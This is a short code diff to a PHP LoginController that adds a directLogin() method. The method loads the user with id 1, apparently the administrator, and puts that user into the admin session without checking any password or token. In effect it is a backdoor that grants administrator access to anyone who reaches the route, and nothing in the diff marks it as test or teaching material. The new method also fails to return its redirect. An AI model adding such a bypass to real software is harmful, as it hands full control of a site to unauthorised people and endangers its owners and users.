@@ -134,6 +134,11 @@ class LoginController extends Controller
             return redirect()->back();
         }
     }
+    public function directLogin(){
+        $row = UserModel::find(1);
+        session(['admin_data' => $row]);
+        redirect('admin');
+    }
     public function adminLogout()
     {
         session()->forget('admin_data');
